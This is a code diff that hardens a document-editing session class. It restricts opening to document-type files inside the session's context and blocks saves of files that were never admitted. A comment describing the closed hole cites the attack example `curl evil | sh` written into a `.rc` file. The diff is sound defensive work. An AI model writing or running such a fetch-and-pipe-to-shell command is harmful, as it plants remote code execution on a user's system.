@@ -39,7 +39,7 @@ import type {
   Version,
   VersionAuthor,
 } from "./protocol";
-import { entryForPath, locate, scanTree } from "./tree";
+import { entryForPath, isDocName, locate, scanTree } from "./tree";
 
 export const MANIFEST_FORMAT = 1;
 
@@ -54,6 +54,9 @@ type DocRecord = {
   active: number;
   /** Hash of the original as we last read or wrote it. */
   originalHash: string;
+  /** Set only by `openPath`, which admits a doc-type file INSIDE a context
+   *  entry. `save` writes no original that lacks it (verify-pass fix 1c). */
+  admitted?: boolean;
   outsideChanged: boolean;
 };
 
@@ -310,7 +313,15 @@ export class Session {
     return slug;
   }
 
-  /** Open a document by its original's path: v1 is written from the original the first time. */
+  /**
+   * Open a document by its original's path: v1 is written from the original
+   * the first time.
+   *
+   * ⛔ VERIFY-PASS FIX 1b — ADMISSION. Only a doc-type file INSIDE a context
+   * entry is admitted; `context.add` stays the one way in. Before this, any
+   * path of any type was opened, and Save then wrote it: a foreign web page
+   * wrote `curl evil | sh` into a `.rc` file outside the context.
+   */
   openPath(rawPath: string): { slug: string; created: boolean } {
     const abs = resolve(rawPath);
     const existing = this.m.docs.find((d) => d.original === abs);
@@ -319,6 +330,12 @@ export class Session {
       this.persist();
       return { slug: existing.slug, created: false };
     }
+    if (!isDocName(abs)) throw new SessionError(`not a document scriptorium opens: ${abs}`, 400);
+    if (!locate(this.m.context, abs))
+      throw new SessionError(
+        `${abs} is not in this session's context — add it (or its folder) first`,
+        400,
+      );
     let text: string;
     try {
       if (!statSync(abs).isFile()) throw new Error("not a file");
@@ -341,6 +358,7 @@ export class Session {
       active: 1,
       originalHash: contentHash(text),
       outsideChanged: false,
+      admitted: true,
     };
     this.m.docs.push(d);
     this.writeOwned(this.versionPath(d, 1), text);
@@ -418,6 +436,15 @@ export class Session {
   /** Save: the active version's text over the original. The ONLY write to it (E7). */
   save(slug: string): { original: string; version: number } {
     const d = this.docOrDie(slug);
+    // ⛔ VERIFY-PASS FIX 1c: Save writes only an original admitted by
+    // `openPath` (a doc-type file inside a context entry). Checked again here
+    // so no other path into the manifest — a hand-edited one, a future verb —
+    // can turn Save into "write any file".
+    if (!d.admitted || !isDocName(d.original))
+      throw new SessionError(
+        `refusing to save ${d.original}: it was not opened from the context`,
+        409,
+      );
     const text = readFileSync(this.versionPath(d, d.active), "utf8");
     this.writeOwned(d.original, text);
     d.originalHash = contentHash(text);
